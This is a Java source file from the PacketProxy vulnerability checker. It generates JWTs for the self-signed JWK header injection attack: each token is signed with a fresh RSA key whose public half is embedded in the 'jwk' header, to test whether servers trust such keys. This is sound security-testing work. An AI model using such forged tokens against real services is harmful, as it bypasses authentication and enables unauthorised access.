/*
 * Copyright 2023 DeNA Co., Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package packetproxy.vulchecker.generator;

import org.apache.commons.codec.binary.Base64;

import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.UUID;

/*
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
ref. https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter
*/

public class JWTHeaderJWKGenerator extends Generator {
    @Override
    public String getName() {
        return "Header: 自己署名JWK";
    }

    @Override
    public boolean generateOnStart() {
        return true;
    }

    @Override
    public String generate(String inputData) throws Exception {

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048);
        KeyPair kp = kpg.genKeyPair();
        RSAPublicKey publicKey = (RSAPublicKey) kp.getPublic();

        String kid = UUID.randomUUID().toString();
        String typ = "JWT";
        String alg = "RS256";
        String jwk_kty = "RSA";
        String jwk_e = Base64.encodeBase64URLSafeString(publicKey.getPublicExponent().toByteArray());
        String jwk_kid = kid;
        String jwk_n = Base64.encodeBase64URLSafeString(publicKey.getModulus().toByteArray());

        JWTAlgRS256 jwt = new JWTAlgRS256(inputData, (RSAPrivateKey) kp.getPrivate());
        jwt.setHeaderValue("kid", kid);
        jwt.setHeaderValue("typ", typ);
        jwt.setHeaderValue("alg", alg);
        jwt.setHeaderValue("jwk/kty", jwk_kty);
        jwt.setHeaderValue("jwk/e", jwk_e);
        jwt.setHeaderValue("jwk/kid", jwk_kid);
        jwt.setHeaderValue("jwk/n", jwk_n);
        return jwt.toJwtString();
    }
}